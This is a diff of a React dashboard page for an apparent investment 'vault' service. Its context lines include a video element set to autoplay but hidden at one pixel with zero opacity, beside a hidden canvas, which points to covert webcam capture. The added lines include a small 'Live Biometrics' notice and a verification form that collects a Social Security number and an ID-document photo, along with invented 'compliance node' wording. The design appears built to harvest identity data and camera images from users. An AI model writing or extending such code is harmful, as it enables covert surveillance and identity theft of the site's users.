@@ -230,9 +230,7 @@ export default function Dashboard() {
       <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
       <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Verifying Identity...</p>
     </div>
-  );
-
-  return (
+  );return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black relative">
       <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" style={{ zIndex: -1 }} />
       <canvas ref={canvasRef} className="hidden" />
@@ -401,4 +399,72 @@ export default function Dashboard() {
           </div>
 
           <div className="lg:col-span-4 space-y-6">
-             <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y
+             <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y-8">
+                <div className="flex justify-between items-center border-b border-white/5 pb-4">
+                   <div className="flex items-center gap-3"><ShieldCheck size={18} className={isUnlocked ? 'text-green-500' : 'text-yellow-500'} /><span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">Vault Status</span></div>
+                   <span className={`text-[11px] font-mono uppercase ${isUnlocked ? 'text-green-500' : 'text-yellow-500'}`}>{user?.deposit_status || 'Checking'}</span>
+                </div>
+                <div className="flex justify-between items-center border-b border-white/5 pb-4">
+                   <div className="flex items-center gap-3"><User size={18} className="text-blue-400" /><span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">KYC Level</span></div>
+                   <span className="text-[11px] font-mono text-white uppercase">{user?.kyc_status === 'verified' ? 'ELITE' : 'BASIC'}</span>
+                </div>
+                <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
+                   <div className="relative"><Camera size={20} className="text-[#D4AF37]" /><div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" /></div>
+                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 3 seconds.</p>
+                </div>
+             </div>
+          </div>
+        </div>
+
+        {/* KYC SECTION */}
+        {user?.kyc_status === 'verified' ? (
+          <div className="bg-[#0a0a0a] border border-[#D4AF37]/30 rounded-[2.5rem] p-12 text-center flex flex-col items-center gap-6 shadow-[0_0_50px_rgba(212,175,55,0.05)]">
+             <div className="w-24 h-24 bg-[#D4AF37]/10 rounded-full flex items-center justify-center border border-[#D4AF37] shadow-lg"><ShieldCheck size={48} className="text-[#D4AF37]" /></div>
+             <div><h3 className="text-3xl font-serif text-white mb-3">Identity Verified</h3><p className="text-gray-500 text-sm max-w-lg mx-auto leading-relaxed">Your secure profile has been successfully validated. You now have Tier-1 access to all global markets and high-limit withdrawals.</p></div>
+             <div className="px-8 py-3 bg-[#D4AF37]/10 rounded-full border border-[#D4AF37]/20 text-[#D4AF37] text-xs uppercase font-bold tracking-widest flex items-center gap-2"><CheckCircle size={14} /> Compliance Status: Elite</div>
+          </div>
+        ) : (
+          <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
+            <div className="max-w-3xl">
+              <div className="flex items-center gap-3 mb-6"><ShieldCheck size={24} className="text-[#D4AF37]" /><h3 className="text-3xl md:text-4xl font-serif">Security Verification</h3></div>
+              <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>
+
+              {showPendingScreen ? (
+                <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
+                   <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
+                   <p className="text-xs uppercase tracking-[0.3em] font-bold text-white">Security Review in Progress</p>
+                   <p className="text-[10px] text-gray-500">Your documents are currently being decrypted and verified by our compliance node.</p>
+                </div>
+              ) : (
+                <form onSubmit={handleKyc} className="space-y-8">
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div className="space-y-2">
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Identity Document</label>
+                      <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs transition-all cursor-pointer">
+                        <option value="driver_license">Driver's License</option>
+                        <option value="passport">International Passport</option>
+                      </select>
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Social Security Number</label>
+                      <input type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={handleSsnChange} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs tracking-widest" required />
+                    </div>
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Proof of Identity (Front View)</label>
+                    <div className="relative group min-h-[160px] border-2 border-dashed border-white/10 rounded-3xl p-6 flex flex-col items-center justify-center gap-3 bg-black hover:border-[#D4AF37]/50 transition-all cursor-pointer">
+                      <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
+                      <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center text-gray-400 group-hover:text-[#D4AF37] transition-colors"><Upload size={20} /></div>
+                      <span className="text-[10px] uppercase font-bold tracking-widest text-gray-500 group-hover:text-white transition-colors">{idFile ? idFile.name : `Attach ${idType.replace('_', ' ')} Photo`}</span>
+                    </div>
+                  </div>
+                  <button disabled={kycSubmitting} className="w-full md:w-auto px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[11px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl active:scale-95">{kycSubmitting ? "Encrypting Documents..." : "Finalize Verification"}</button>
+                </form>
+              )}
+            </div>
+          </div>
+        )}
+      </div>
+    </main>
+  );
+            }
